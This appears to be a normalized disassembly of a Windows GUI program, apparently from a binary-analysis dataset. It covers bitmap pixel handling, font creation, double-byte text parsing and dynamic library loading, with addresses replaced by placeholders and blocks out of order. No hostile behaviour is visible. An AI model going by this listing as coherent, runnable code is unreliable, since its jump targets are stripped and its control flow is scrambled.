jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x14
mov edi [ esp + 0x1c ]
add eax 0xf
and eax 0xfffffff0
mov [ esi + 0x42c ] eax
jmp r-xdata
mov [ ecx + 0x1 ] al
mov [ ecx ] al
mov [ ecx - 0x1 ] al
mov [ ecx + 0x2 ] 0x0
inc eax
add ecx 0x4
cmp eax 0x100
jl r-xdata
movzx eax [ esi + 0xe ]
imul eax [ esi + 0x4 ]
mov ecx [ esp + 0x1c ]
cdq
and edx 0x7
add eax edx
mov edi eax
sar edi 0x3
xor eax eax
add edi 0x3
and edi 0xfffffffc
cmp ecx 0x20000008
mov [ esi ] 0x28
mov [ esi + 0xc ] 0x1
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
jne r-xdata
jne r-xdata
mov ecx [ esi + 0x45c ]
test ecx ecx
jne r-xdata
cmp [ eax ] 0x1
mov ecx eax
jne r-xdata
dec [ eax ]
mov edx [ eax + 0x4 ]
dec [ edx + 0xc ]
mov [ esi + 0x474 ] 0x0
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
mov [ esi + 0x440 ] edi
pop edi
mov [ esi + 0x444 ] eax
mov [ esi + 0x438 ] ebp
mov [ esi + 0x43c ] ebx
mov [ esi + 0x448 ] ecx
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x14
cmp [ ecx ] 0x1
jne r-xdata
dec [ ecx ]
mov eax [ eax + 0x4 ]
dec [ eax + 0xc ]
xor ecx ecx
mov eax [ ecx + 0x4 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
inc [ eax + 0x8 ]
mov ecx [ ecx + 0x8 ]
add ecx [ eax ]
jmp r-xdata
mov [ esi + 0x42c ] ecx
sub_439a90
sub esp 0x14
push ebx
mov ebx ecx
push edi
mov edi [ ebx + 0x42c ]
test edi edi
jne r-xdata
mov eax [ ebx + 0x428 ]
test eax eax
push ebp
push esi
je r-xdata
pop edi
xor eax eax
pop ebx
add esp 0x14
retn
mov eax [ ebx + 0x444 ]
mov ebp [ ebx + 0x438 ]
mov edx [ ebx + 0x448 ]
mov ecx eax
and ecx 0x7
add ebp ecx
and eax 0xfffffff8
mov [ ebx + 0x438 ] ebp
mov ebp eax
mov eax [ ebx + 0x8 ]
mov [ esp + 0x20 ] eax
mov eax [ ebx + 0x45c ]
test eax eax
mov [ ebx + 0x444 ] ecx
mov [ esp + 0x1c ] edx
mov [ ebx + 0x448 ] 0x0
jne r-xdata
mov eax [ ebx + 0x45c ]
test eax eax
mov esi [ ebx + 0x43c ]
jne r-xdata
mov edx [ eax + 0xc ]
mov [ esp + 0x14 ] edx
mov esi edx
movzx eax [ ebx + 0xe ]
imul eax [ ebx + 0x4 ]
add eax 0x7
cdq
and edx 0x7
add eax edx
mov esi eax
sar esi 0x3
add esi 0x3
and esi 0xfffffffc
mov [ esp + 0x14 ] esi
jmp r-xdata
mov ebp [ eax + 0xc ]
movzx eax [ ebx + 0xe ]
imul eax [ ebx + 0x4 ]
add eax 0x7
cdq
and edx 0x7
add eax edx
mov ebp eax
sar ebp 0x3
add ebp 0x3
and ebp 0xfffffffc
jmp r-xdata
pop esi
pop ebp
pop edi
pop ebx
add esp 0x14
retn
mov ecx ebx
call sub_435850
mov ecx [ ebx + 0x43c ]
mov edi [ ebx + 0x42c ]
lea edx [ ecx - 0x1 ]
imul edx eax
add edx edi
cmp esi eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x1c ] esi
jl r-xdata
movzx eax [ ebx + 0xe ]
imul eax ebp
cdq
and edx 0x7
add eax edx
mov edx [ ebx + 0x438 ]
mov ebp esi
imul ebp [ esp + 0x1c ]
push 0x0
sar eax 0x3
push ecx
mov ecx [ ebx + 0x43c ]
add edi eax
mov eax [ ebx + 0x440 ]
push eax
push ecx
push edx
mov ecx ebx
add ebp edi
call sub_4397d0
test eax eax
jne r-xdata
mov ecx [ ebx + 0x42c ]
lea eax [ esi - 0x1 ]
imul eax ebp
add eax ecx
mov [ esp + 0x18 ] eax
mov eax esi
cdq
sub eax edx
sar eax 0x1
test eax eax
mov [ esp + 0x10 ] ecx
jle r-xdata
pop esi
pop ebp
pop edi
or eax 0xffffffff
pop ebx
add esp 0x14
retn
push ebp
call j_sub_4b573e#2
mov edi eax
add esp 0x4
test edi edi
mov [ esp + 0x14 ] edi
jne r-xdata
test ecx ecx
jle r-xdata
mov [ esp + 0x1c ] eax
push edi
call j_sub_4b66ed#2
mov eax [ ebx + 0x8 ]
add esp 0x4
pop esi
pop ebp
neg eax
mov [ ebx + 0x8 ] eax
pop edi
xor eax eax
pop ebx
add esp 0x14
retn
mov [ esp + 0x1c ] eax
lea ecx [ ecx ]
mov eax [ esp + 0x20 ]
neg eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ esp + 0x18 ] ecx
mov esi [ esp + 0x10 ]
mov ecx ebp
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x10 ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
mov esi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x14 ]
mov edi eax
mov ecx ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
sub eax ebp
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x1c ]
add ecx ebp
dec eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x1c ] eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov eax ecx
shr ecx 0x2
mov esi ebp
mov edi edx
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
add ebp esi
sub edx ecx
dec eax
mov [ esp + 0x18 ] eax
jne r-xdata
sub_439d20
push ecx
mov eax [ esp + 0x10 ]
push ebp
mov ebp [ esp + 0x10 ]
lea ecx [ ebp * 4 + 0x3 ]
and ecx 0xfffffffc
test eax eax
mov [ esp + 0x4 ] ecx
jle r-xdata
pop ebp
pop ecx
retn
push ebx
push esi
push edi
mov edi [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x1c ]
add edi ecx
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov esi ebp
nop
test ebp ebp
mov eax edi
jle r-xdata
pop edi
pop esi
pop ebx
movzx ecx [ eax + 0x3 ]
movzx ebx [ eax ]
mov dl [ eax + 0x2 ]
imul ebx ecx
inc ebx
sar ebx 0x8
mov [ eax + 0x2 ] bl
movzx ebx [ eax + 0x1 ]
imul ebx ecx
movzx edx dl
imul edx ecx
inc ebx
sar ebx 0x8
inc edx
sar edx 0x8
mov [ eax + 0x1 ] bl
mov [ eax ] dl
add eax 0x4
dec esi
jne r-xdata
mov ecx [ esp + 0x10 ]
sub_439da0
mov eax [ esi ]
sub esp 0x70
push ebx
push ebp
lea ecx [ esp + 0x8 ]
push ecx
push esi
or ebx 0xffffffff
call [ eax + 0x44 ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
push eax
push eax
push edx
call [ GetPixel@IAT ]
mov ecx [ esp + 0x8 ]
mov ebp eax
mov eax [ esp + 0x7c ]
push eax
push 0x0
push 0x0
push ecx
call [ SetPixel@IAT ]
mov eax [ esp + 0x8 ]
mov edx [ esi ]
push eax
push esi
call [ edx + 0x68 ]
jmp r-xdata
mov ecx [ esi ]
push 0x0
push 0x0
lea edx [ esp + 0x14 ]
push edx
push 0x0
push esi
call [ ecx + 0x64 ]
cmp eax 0x8876021c
je r-xdata
test eax eax
jne r-xdata
push edi
mov ecx 0x1b
xor eax eax
lea edi [ esp + 0x10 ]
[ edi ]
mov [ esp + 0x10 ] 0x6c
pop edi
mov ecx [ esi ]
lea edx [ esp + 0x8 ]
push edx
push esi
call [ ecx + 0x44 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x60 ]
cmp ecx 0x20
mov eax [ esp + 0x30 ]
mov ebx [ eax ]
jae r-xdata
pop ebp
mov eax ebx
pop ebx
add esp 0x70
retn
push ebp
push eax
push eax
mov eax [ esp + 0x14 ]
push eax
call [ SetPixel@IAT ]
mov edx [ esp + 0x8 ]
mov ecx [ esi ]
push edx
push esi
call [ ecx + 0x68 ]
mov eax [ esi ]
push 0x0
push esi
call [ eax + 0x80 ]
mov edx 0x1
shl edx cl
dec edx
and ebx edx
sub_439e80
push esi
mov esi ecx
mov eax [ esi + 0xd20 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0xd24 ]
cmp eax edi
je r-xdata
push eax
call [ DeleteObject@IAT ]
mov [ esi + 0xd20 ] edi
lea ecx [ esi + 0x890 ]
call sub_439440
mov [ esi + 0xd28 ] edi
mov [ esi + 0xd2c ] edi
pop edi
pop esi
retn
push eax
call j_sub_4b66ed
add esp 0x4
mov [ esi + 0xd24 ] edi
sub_439ed0
push ebx
push esi
mov esi ecx
call sub_439e80
mov eax [ esi + 0x884 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x8 ]
dec eax
mov [ esi + 0x888 ] bl
mov [ esi + 0x8 ] eax
jne r-xdata
cmp eax ebx
je r-xdata
cmp [ esi + 0x8 ] ebx
jge r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x884 ] ebx
mov [ esi + 0x458 ] ebx
cmp [ eax ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x8 ] ebx
push eax
call [ LocalUnlock@IAT ]
mov [ esi + 0x20 ] ebx
dec [ eax ]
mov ecx [ eax + 0x4 ]
dec [ ecx + 0xc ]
sub_439f30
mov edx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x18 ]
xor ecx ecx
test edx edx
mov [ esi ] 0x0
mov [ edi ] 0x0
jle r-xdata
pop edi
xor eax eax
pop esi
retn
push ebx
push ebp
mov ebp [ esp + 0x14 ]
lea ebx [ ebx ]
cmp al 0x9
je r-xdata
movzx bx [ ecx + ebp + 0x1 ]
mov bh al
mov eax ebx
cmp ax 0x8162
jne r-xdata
mov [ esi ] 0x0
cmp al 0x20
je r-xdata
cmp ax 0x829f
jae r-xdata
mov [ esi ] 0x0
add ecx 0x2
jmp r-xdata
mov al [ ecx + ebp ]
mov bl al
xor bl 0x20
add bl 0x5f
cmp bl 0x3b
ja r-xdata
pop ebp
pop ebx
cmp al 0xd
je r-xdata
cmp ax 0x8340
jae r-xdata
cmp [ esi ] 0x2
je r-xdata
cmp ecx edx
jl r-xdata
cmp al 0xa
je r-xdata
cmp ax 0x889f
mov eax [ esi ]
jae r-xdata
cmp [ esi ] 0x3
je r-xdata
add ecx 0x2
jmp r-xdata
mov [ esi ] 0x2
mov [ edi ] ecx
add ecx 0x2
jmp r-xdata
cmp [ esi ] 0x1
je r-xdata
cmp eax 0x5
je r-xdata
cmp eax 0x4
je r-xdata
mov [ esi ] 0x3
mov [ edi ] ecx
add ecx 0x2
jmp r-xdata
inc ecx
mov [ esi ] 0x1
mov [ edi ] ecx
jmp r-xdata
mov [ esi ] 0x5
mov [ edi ] ecx
mov [ esi ] 0x4
mov [ edi ] ecx
add ecx 0x2
jmp r-xdata
sub_43a020
sub esp 0x3c
push esi
push edi
push rw-data
lea eax [ esp + 0x28 ]
mov ecx 0xf
mov esi rw-data
lea edi [ esp + 0xc ]
push eax
[ edi ] [ esi ]
call [ lstrcpyA@IAT ]
mov ecx [ esp + 0x48 ]
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x4c ]
xor eax eax
cmp ecx eax
pop edi
pop esi
je r-xdata
lea edx [ esp ]
push edx
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] eax
call [ CreateFontIndirectA@IAT ]
add esp 0x3c
retn 0x8
mov eax 0xa8c
sub_43a0a0
push 0xffffffff
push sub_4c01b6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
mov esi [ esp + 0x24 ]
push edi
xor edi edi
mov ecx esi
mov [ esp + 0x14 ] edi
call sub_40b730
mov ecx [ esp + 0x40 ]
cmp ecx 0xc
mov ebx [ esp + 0x3c ]
mov [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esp + 0x34 ]
mov esi [ esp + 0x38 ]
imul eax ecx
cdq
and edx 0x7
add eax edx
xor ebp ebp
sar eax 0x3
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x38 ]
mov ecx eax
and ecx 0x1
lea esi [ ecx + eax ]
mov eax ebx
cdq
sub eax edx
mov edi eax
mov eax [ esp + 0x34 ]
mov ebp esi
mov [ esp + 0x14 ] eax
imul ebp ebx
mov eax esi
cdq
sub eax edx
mov esi eax
mov eax [ esp + 0x38 ]
sar esi 0x1
sar edi 0x1
add esi ecx
add edi ebp
mov [ esp + 0x10 ] ebx
add esi eax
jmp r-xdata
mov [ esp + 0x3c ] ecx
mov eax ecx
mov ecx eax
call sub_40ac00
mov [ esp + 0x3c ] eax
jmp r-xdata
push 0x10
imul esi ebx
call sub_4b573e
add esp 0x4
mov [ esp + 0x3c ] eax
xor ecx ecx
cmp eax ecx
mov [ esp + 0x20 ] ecx
je r-xdata
xor eax eax
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x38 ]
push edx
mov edx [ esp + 0x18 ]
push edi
push ebp
push ecx
mov ecx [ esp + 0x4c ]
push edx
push ebx
push 0x0
push ecx
mov ecx eax
call sub_40ac50
jmp r-xdata
mov ecx [ esp + 0x30 ]
mov [ eax ] ecx
push 0x24
mov [ esp + 0x24 ] 0xffffffff
mov [ eax + 0x4 ] esi
call j_sub_4b573e
add esp 0x4
mov [ esp + 0x30 ] eax
test eax eax
mov [ esp + 0x20 ] 0x1
je r-xdata
mov ecx [ esp + 0x1c ]
mov [ ecx ] eax
mov eax ecx
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x1c
inc [ eax ]
test eax eax
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x40 ]
pop edi
pop esi
mov [ ecx + 0x8 ] edx
mov edx [ esp + 0x2c ]
pop ebp
mov [ ecx ] eax
mov [ ecx + 0xc ] edx
pop ebx
je r-xdata
sub_43a1f0
push esi
mov esi ecx
call sub_439440
mov eax [ esi + 0x45c ]
test eax eax
pop esi
je r-xdata
retn
cmp [ eax ] 0x1
jne r-xdata
dec [ eax ]
mov ecx [ eax + 0x4 ]
dec [ ecx + 0xc ]
sub_43a220
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp eax edx
je r-xdata
retn
mov ecx [ esp + 0xc ]
push esi
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
add eax 0x8
cmp eax edx
jne r-xdata
pop esi
sub_43a250
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_4607a0
add esp 0x14
lea eax [ edi + esi * 8 ]
pop edi
pop esi
retn 0xc
sub_43a280
push esi
mov esi ecx
mov eax [ esi + 0xd3c ]
test eax eax
je r-xdata
mov [ esi + 0xd3c ] 0x0
mov [ esi + 0xd40 ] 0x0
mov [ esi + 0xd44 ] 0x0
xor eax eax
pop esi
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_43a2c0
push 0xffffffff
push sub_4c01c8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_43a340
push ebp
mov ebp esp
push 0xffffffff
push sub_4c01e0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x4 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] edx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_43a2c0
mov ebx 0x1fffffff
sub ebx edi
cmp ebx edx
jae r-xdata
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x3
cmp eax edx
jae r-xdata
mov edi eax
shr edi 0x1
mov ebx 0x1fffffff
sub ebx edi
cmp ebx eax
jae r-xdata
add edi edx
cmp eax edi
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x3
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_4aae70
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_4013f0
add esp 0x10
lea eax [ ebp - 0x1c ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 8 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp + 0x10 ] esp
mov [ eax ] edi
call sub_4aae70
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x1c ]
push edx
mov edx ecx
sub edx edi
sar edx 0x3
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_43a250
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp - 0x1c ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax edi
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_43a220
add esp 0xc
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
test ecx ecx
jne r-xdata
shl eax 0x3
push eax
mov [ ebp + 0x10 ] eax
call sub_4b573e
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0x4
push ecx
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_45f700
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push edi
call sub_4607a0
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 8 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_45f700
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
add edi edx
cmp eax edi
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
add edx ebx
lea eax [ ebx + edi * 8 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_43a5f0
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
cmp eax edx
jae r-xdata
pop edi
pop esi
retn 0xc
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x3
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
push ecx
lea eax [ eax + edx * 8 ]
mov esi esp
lea edx [ esp + 0x14 ]
push edx
mov [ esi ] eax
call sub_461ba0
sub edx eax
lea esi [ esp + 0x10 ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ eax ] edx
call sub_43a340
pop edi
pop esi
retn 0xc
sub_43a670
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_43a340
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x3
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_4607a0
add esp 0x14
add edi 0x8
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_43a6e0
push ecx
push ebx
push ebp
push esi
mov ebx ecx
push edi
xor edi edi
lea esi [ ebx + 0x34 ]
mov [ esp + 0x10 ] edi
mov ecx [ esi + 0x4 ]
xor ebp ebp
mov ecx [ esi + 0x4 ]
cmp ecx edi
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
cmp ebp eax
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x38 ]
mov eax [ eax + ebp * 4 ]
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
mov esi [ esp + 0x18 ]
push edx
mov edx [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push ecx
mov ecx [ ebx + 0x38 ]
push edx
mov edx [ ecx + ebp * 4 ]
push eax
push esi
push edx
call sub_43a0a0
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x18
mov ecx [ esi + 0x4 ]
cmp ecx edi
je r-xdata
cmp ebp eax
jne r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0xc ] edi
je r-xdata
push 0x10
call sub_4b573e
add esp 0x4
cmp eax edi
je r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
cmp eax 0x64
jbe r-xdata
inc ebp
jmp r-xdata
xor eax eax
mov [ eax ] edi
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
push 0x64
push r--data
push ebx
call [ eax + 0x14 ]
add esp 0xc
cmp ecx edi
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx edi
jne r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx edi
jne r-xdata
cmp eax edi
mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_418070
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
cmp edx edi
je r-xdata
mov ecx [ ebx ]
push eax
push r--data
push ebx
call [ ecx + 0x14 ]
add esp 0xc
mov edx [ esp + 0x2c ]
mov edi [ esi + 0x8 ]
push edx
push esi
lea eax [ esp + 0x18 ]
push eax
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
jmp r-xdata
sub_43a840
push 0xffffffff
push sub_4c01f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov ecx rw-data
mov [ esp ] rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0xc ] 0x0
jne r-xdata
mov ecx rw-data
call sub_401420
mov eax 0x1
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push r--data
call [ LoadLibraryA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
test ecx ecx
mov [ rw-data ] eax
pop esi
je r-xdata
mov al [ esp + 0x14 ]
test al al
je r-xdata
mov al [ esp + 0x14 ]
test al al
je r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push 0x0
push r--data
push r--data
jmp r-xdata
push 0x0
push r--data
push r--data
mov edx [ rw-data ]
test edx edx
je r-xdata
push 0x0
call [ MessageBoxA@IAT ]
mov edx [ rw-data ]
test edx edx
je r-xdata
test eax eax
je r-xdata
call ecx
cmp eax 0x1
jne r-xdata
sub_43a9a0
mov ecx rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx rw-data
call sub_401420
mov eax 0x1
retn
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov ecx [ rw-data ]
test ecx ecx
mov [ rw-data ] eax
pop esi
je r-xdata
mov al [ esp + 0x4 ]
test al al
je r-xdata
mov al [ esp + 0x4 ]
test al al
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
retn
push 0x0
push r--data
push r--data
jmp r-xdata
push 0x0
push r--data
push r--data
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push 0x0
call [ MessageBoxA@IAT ]
test eax eax
jne r-xdata
sub_43aa90
push 0xffffffff
push sub_4c01f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov ecx rw-data
mov [ esp ] rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0xc ] 0x0
jne r-xdata
mov ecx rw-data
call sub_401420
mov eax 0x1
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push r--data
call [ LoadLibraryA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
mov [ rw-data ] eax
